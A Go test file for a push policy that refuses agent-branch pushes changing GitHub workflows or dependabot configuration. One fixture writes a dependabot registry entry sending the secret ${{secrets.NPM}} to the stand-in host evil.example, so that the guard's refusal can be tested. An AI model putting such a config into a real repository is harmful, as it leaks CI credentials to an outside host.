package policy

import (
	"bytes"
	"encoding/hex"
	"errors"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

type repo struct {
	t   testing.TB
	dir string
}

func (r repo) git(stdin string, args ...string) string {
	r.t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = r.dir
	cmd.Env = append(os.Environ(), "GIT_CONFIG_NOSYSTEM=1", "GIT_CONFIG_GLOBAL=/dev/null",
		"GIT_AUTHOR_NAME=a", "GIT_AUTHOR_EMAIL=a@x", "GIT_COMMITTER_NAME=a", "GIT_COMMITTER_EMAIL=a@x")
	cmd.Stdin = strings.NewReader(stdin)
	var out, errb bytes.Buffer
	cmd.Stdout, cmd.Stderr = &out, &errb
	if err := cmd.Run(); err != nil {
		r.t.Fatalf("git %v: %v\n%s", args, err, errb.String())
	}
	return out.String()
}

func (r repo) write(path, content string) {
	os.MkdirAll(filepath.Join(r.dir, filepath.Dir(path)), 0o755)
	os.WriteFile(filepath.Join(r.dir, path), []byte(content), 0o644)
}

func (r repo) commit(msg string) string {
	r.git("", "add", "-A")
	r.git("", "commit", "-q", "--allow-empty", "-m", msg)
	return strings.TrimSpace(r.git("", "rev-parse", "HEAD"))
}

// pack builds what git would send to push tip on top of base, the way
// receive-pack with no-thin asks for it.
func (r repo) pack(tip, base string) *Pack {
	r.t.Helper()
	revs := tip + "\n"
	if base != "" {
		revs += "^" + base + "\n"
	}
	raw := r.git(revs, "pack-objects", "--stdout", "--revs", "--delta-base-offset")
	p, err := ReadPack(strings.NewReader(raw))
	if err != nil {
		r.t.Fatal(err)
	}
	return p
}

// fetch is what GitHub returns for a blobless, depth-1 fetch of commits.
func (r repo) fetch(commits []string) (map[string]Object, error) {
	list := r.git(strings.Join(commits, "\n")+"\n", "rev-list", "--objects", "--no-walk", "--filter=blob:none", "--stdin")
	var ids []string
	for line := range strings.SplitSeq(strings.TrimSpace(list), "\n") {
		ids = append(ids, strings.Fields(line)[0])
	}
	raw := r.git(strings.Join(ids, "\n")+"\n", "pack-objects", "--stdout")
	p, err := ReadPack(strings.NewReader(raw))
	if err != nil {
		return nil, err
	}
	return p.Objects, nil
}

func TestWorkflowChanges(t *testing.T) {
	t.Parallel()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	r := repo{t, t.TempDir()}
	r.git("", "init", "-q", "-b", "main")
	r.write("README", "hi\n")
	r.write(".github/workflows/ci.yml", "on: push\n")
	r.write(".github/CODEOWNERS", "* @me\n")
	base := r.commit("base")

	// check pushes tip to agent/x, from old (zeroOID for a create), with a
	// pack built on from, while main's head is def.
	check := func(name, old, tip, from, def string, wantRefused bool) {
		t.Helper()
		p := &Pack{Objects: map[string]Object{}}
		if from != "skip" {
			p = r.pack(tip, from)
		}
		got, err := WorkflowChanges(p, []RefUpdate{{Old: old, New: tip, Ref: "refs/heads/agent/x"}}, def, nil, r.fetch)
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if refused := got["refs/heads/agent/x"] != ""; refused != wantRefused {
			t.Errorf("%s: refused=%v (%v), want %v", name, refused, got, wantRefused)
		}
	}
	z := zeroOID

	r.write("README", "changed\n")
	r.write(".github/CODEOWNERS", "* @someone\n")
	code := r.commit("code and CODEOWNERS")
	check("code change", z, code, base, base, false)

	r.write(".github/workflows/ci.yml", "on: push\njobs: {evil: {}}\n")
	evil := r.commit("edit workflow")
	check("workflow edit", z, evil, base, base, true)
	check("workflow edit behind a clean commit", z, evil, code, base, true)
	check("workflow edit as an update", code, evil, code, base, true)

	// A commit already on GitHub, like a fork PR's head, pushed with an
	// empty pack.
	check("existing commit with a workflow edit", z, evil, "skip", base, true)
	check("existing clean commit", z, code, "skip", base, false)

	r.git("", "checkout", "-q", "-b", "deps", code)
	r.write(".github/dependabot.yml", "version: 2\nregistries: {npm: {type: npm-registry, url: https://evil.example, token: ${{secrets.NPM}}}}\n")
	deps := r.commit("add dependabot config")
	check("dependabot config add", z, deps, code, base, true)
	r.write(".github/dependabot.yaml", "version: 2\n")
	r.git("", "rm", "-q", ".github/dependabot.yml")
	depsYAML := r.commit("rename dependabot config")
	check("dependabot config edit", deps, depsYAML, deps, base, true)
	r.git("", "checkout", "-q", "main")

	r.git("", "rm", "-q", "-r", ".github/workflows")
	gone := r.commit("delete workflows")
	check("workflow delete", evil, gone, evil, base, true)

	r.git("", "checkout", "-q", "-b", "side", base)
	r.write("other", "x\n")
	r.commit("side work")
	r.git("", "checkout", "-q", "main")
	r.git("", "reset", "-q", "--hard", code)
	r.git("", "merge", "-q", "--no-edit", "side")
	merge := strings.TrimSpace(r.git("", "rev-parse", "HEAD"))
	check("merge without workflow change", z, merge, code, base, false)

	// Someone changed workflows on main; an agent branch that merges main
	// takes main's version.
	r.git("", "checkout", "-q", "-b", "follow", code)
	r.git("", "merge", "-q", "--no-edit", evil)
	follow := strings.TrimSpace(r.git("", "rev-parse", "HEAD"))
	check("merging main's workflow change", code, follow, code, evil, false)
	check("same merge while main hasn't changed", code, follow, code, base, true)

	// Restoring main's version is no change from what main runs.
	r.git("", "checkout", "-q", "-b", "revert", evil)
	r.git("", "checkout", "-q", base, "--", ".github/workflows")
	back := r.commit("restore main's workflow")
	check("restore main's workflow", evil, back, evil, base, false)

	// A brand new history that adds workflows.
	r.git("", "checkout", "-q", "--orphan", "fresh")
	r.git("", "rm", "-q", "-r", "--cached", ".")
	r.write(".github/workflows/new.yml", "on: push\n")
	fresh := r.commit("root with workflow")
	check("root commit with workflow", z, fresh, "", base, true)

	// A .github with none of the guarded entries is no change from none.
	r.git("", "checkout", "-q", "--orphan", "plain")
	r.git("", "rm", "-q", "-r", "--cached", ".")
	r.git("", "clean", "-q", "-fdx")
	r.write("README", "hi\n")
	bare := r.commit("no .github")
	r.write(".github/CODEOWNERS", "* @me\n")
	owners := r.commit("add CODEOWNERS")
	check("first .github file, not guarded", bare, owners, bare, bare, false)
}

func TestParseCommitReadsLikeGit(t *testing.T) {
	const a = "1111111111111111111111111111111111111111"
	const b = "2222222222222222222222222222222222222222"
	good := "tree " + a + "\nparent " + b + "\nauthor x <x> 1 +0000\ncommitter x <x> 1 +0000\n\nmsg\n"
	if c, err := ParseCommit([]byte(good)); err != nil || c.Tree != a || len(c.Parents) != 1 {
		t.Fatalf("%+v %v", c, err)
	}
	// Nothing but tree and parent lines in the header.
	if c, err := ParseCommit([]byte("tree " + a + "\nparent " + b + "\n\nmsg\n")); err != nil || len(c.Parents) != 1 {
		t.Fatalf("%+v %v", c, err)
	}
	for name, bad := range map[string]string{
		"second tree":    "tree " + a + "\nauthor x <x> 1 +0000\ntree " + b + "\n\nmsg\n",
		"late parent":    "tree " + a + "\nauthor x <x> 1 +0000\nparent " + b + "\n\nmsg\n",
		"tree not first": "parent " + b + "\ntree " + a + "\n\nmsg\n",
		"malformed tree": "tree xyz\n\nmsg\n",
	} {
		if c, err := ParseCommit([]byte(bad)); err == nil {
			t.Errorf("%s: parsed as %+v", name, c)
		}
	}
}

func TestReadPackStopsAtTrailer(t *testing.T) {
	t.Parallel()
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("no git")
	}
	r := repo{t, t.TempDir()}
	r.git("", "init", "-q")
	r.write("a", strings.Repeat("line\n", 1000))
	c := r.commit("one")
	r.write("a", strings.Repeat("line\n", 1000)+"more\n")
	c2 := r.commit("two")
	raw := r.git(c2+"\n", "pack-objects", "--stdout", "--revs")
	rd := strings.NewReader(raw + "AFTER")
	p, err := ReadPack(rd)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := p.Objects[c]; !ok {
		t.Error("first commit missing from pack")
	}
	if p.Size != int64(len(raw)) {
		t.Errorf("pack size %d, want %d", p.Size, len(raw))
	}
	bad := []byte(raw)
	bad[len(bad)-1] ^= 1
	if _, err := ReadPack(bytes.NewReader(bad)); err == nil {
		t.Error("accepted a pack with a bad checksum")
	}
}

func TestFoldEntriesRefusesMalformed(t *testing.T) {
	id := bytes.Repeat([]byte{1}, 20)
	for name, data := range map[string]string{
		"no space":     "40000.github\x00" + string(id),
		"no NUL":       "40000 .github" + string(id),
		"truncated ID": "40000 .github\x00" + string(id[:10]),
	} {
		if entries, err := foldEntries([]byte(data), ".github", maxMatches); err == nil {
			t.Errorf("%s: read as %v", name, entries)
		}
	}
}

// treeData encodes entries, each a mode, name, and hex ID, as a tree.
func treeData(entries ...[3]string) []byte {
	var out []byte
	for _, e := range entries {
		id, _ := hex.DecodeString(e[2])
		out = append(out, e[0]+" "+e[1]+"\x00"+string(id)...)
	}
	return out
}

// WorkflowChanges against objects built by hand, for pushes git wouldn't
// make: objects of the wrong type where a commit or tree should be, and
// objects missing from both the pack and GitHub.
func TestWorkflowChangesHandBuilt(t *testing.T) {
	put := func(objs map[string]Object, typ string, data []byte) string {
		id := objectID(typ, data)
		objs[id] = Object{Type: typ, Data: data}
		return id
	}
	commit := func(objs map[string]Object, tree string, parents ...string) string {
		s := "tree " + tree + "\n"
		for _, p := range parents {
			s += "parent " + p + "\n"
		}
		return put(objs, "commit", []byte(s+"\nmsg\n"))
	}

	// GitHub's side. a and b stand in for the IDs of two workflows trees.
	gh := map[string]Object{}
	ghBase := put(gh, "tree", treeData([3]string{"40000", "workflows", a}))
	base := commit(gh, put(gh, "tree", treeData([3]string{"40000", ".github", ghBase})))
	// The same workflows, under a .github that differs from base's.
	ghOwners := put(gh, "tree", treeData([3]string{"100644", "CODEOWNERS", b}, [3]string{"40000", "workflows", a}))
	owners := commit(gh, put(gh, "tree", treeData([3]string{"40000", ".github", ghOwners})), base)
	plain := commit(gh, put(gh, "tree", treeData([3]string{"100644", "README", b})))
	// Commits whose data is a tree's.
	rootAsCommit := put(gh, "commit", gh[objectID("tree", treeData([3]string{"40000", ".github", ghBase}))].Data)
	ghAsCommit := put(gh, "commit", gh[ghBase].Data)

	// fetch answers like GitHub's blobless fetch: each commit asked for,
	// with its trees.
	fetch := func(ids []string) (map[string]Object, error) {
		if len(ids) == 0 {
			return nil, errors.New("fetch of nothing")
		}
		out := map[string]Object{}
		var add func(id string)
		add = func(id string) {
			o, ok := gh[id]
			if _, dup := out[id]; !ok || dup {
				return
			}
			out[id] = o
			switch o.Type {
			case "commit":
				if c, err := ParseCommit(o.Data); err == nil {
					add(c.Tree)
				}
			case "tree":
				for d := o.Data; len(d) > 0; {
					sp, nul := bytes.IndexByte(d, ' '), bytes.IndexByte(d, 0)
					if string(d[:sp]) == "40000" {
						add(hex.EncodeToString(d[nul+1 : nul+21]))
					}
					d = d[nul+21:]
				}
			}
		}
		for _, id := range ids {
			add(id)
		}
		return out, nil
	}

	const (
		unknown = "couldn't check"
		changed = "can't change .github/workflows"
	)
	create := func(ref, tip string) RefUpdate { return RefUpdate{Old: zeroOID, New: tip, Ref: "refs/heads/" + ref} }
	cases := []struct {
		name string
		pack func(p map[string]Object) []RefUpdate
		def  string
		want map[string]string // ref to part of its refusal
	}{
		{"tip whose tree is nowhere", func(p map[string]Object) []RefUpdate {
			return []RefUpdate{create("x", commit(p, strings.Repeat("c", 40)))}
		}, plain, map[string]string{"refs/heads/x": unknown}},
		{"tip that's a tree", func(p map[string]Object) []RefUpdate {
			// ReadPack keeps a tree whatever its bytes.
			return []RefUpdate{create("x", put(p, "tree", gh[base].Data))}
		}, base, map[string]string{"refs/heads/x": unknown}},
		{"root tree that's a commit", func(p map[string]Object) []RefUpdate {
			// The parent line gets it fetched.
			return []RefUpdate{create("x", commit(p, rootAsCommit, rootAsCommit))}
		}, base, map[string]string{"refs/heads/x": unknown}},
		{".github that's a commit", func(p map[string]Object) []RefUpdate {
			root := put(p, "tree", treeData([3]string{"40000", ".github", ghAsCommit}))
			return []RefUpdate{create("x", commit(p, root, ghAsCommit))}
		}, base, map[string]string{"refs/heads/x": unknown}},
		{"every ref of a push is checked", func(p map[string]Object) []RefUpdate {
			lost := commit(p, strings.Repeat("c", 40))
			evil := commit(p, put(p, "tree", treeData([3]string{"40000", ".github", put(p, "tree", treeData([3]string{"40000", "workflows", b}))})), base)
			return []RefUpdate{
				{Old: base, New: zeroOID, Ref: "refs/heads/gone"},
				create("lost", lost),
				{Old: lost, New: base, Ref: "refs/heads/from-lost"},
				create("evil", evil),
			}
		}, base, map[string]string{"refs/heads/lost": unknown, "refs/heads/from-lost": unknown, "refs/heads/evil": changed}},
		{"unchanged .github that only the parent has", func(p map[string]Object) []RefUpdate {
			// Many trees in the pack, so a walk that stops at the first
			// one rarely reaches the commit.
			entries := [][3]string{{"40000", ".github", ghOwners}}
			for i := range 16 {
				sub := put(p, "tree", treeData([3]string{"100644", "f", objectID("blob", []byte{byte(i)})}))
				entries = append(entries, [3]string{"40000", "d" + string(rune('a'+i)), sub})
			}
			return []RefUpdate{create("x", commit(p, put(p, "tree", treeData(entries...)), owners))}
		}, base, nil},
		{"first push to an empty repo", func(p map[string]Object) []RefUpdate {
			return []RefUpdate{create("main", commit(p, put(p, "tree", treeData([3]string{"100644", "README", b}))))}
		}, "", nil},
	}
	// WorkflowChanges walks maps, so a bug that depends on their order
	// shows only some of the time.
	for range 10 {
		for _, c := range cases {
			p := &Pack{Objects: map[string]Object{}}
			updates := c.pack(p.Objects)
			got, err := WorkflowChanges(p, updates, c.def, nil, fetch)
			if err != nil {
				t.Fatalf("%s: %v", c.name, err)
			}
			if len(got) != len(c.want) {
				t.Fatalf("%s: refused %v, want %v", c.name, got, c.want)
			}
			for ref, want := range c.want {
				if !strings.Contains(got[ref], want) {
					t.Fatalf("%s: %s refused with %q, want %q", c.name, ref, got[ref], want)
				}
			}
		}
	}
}
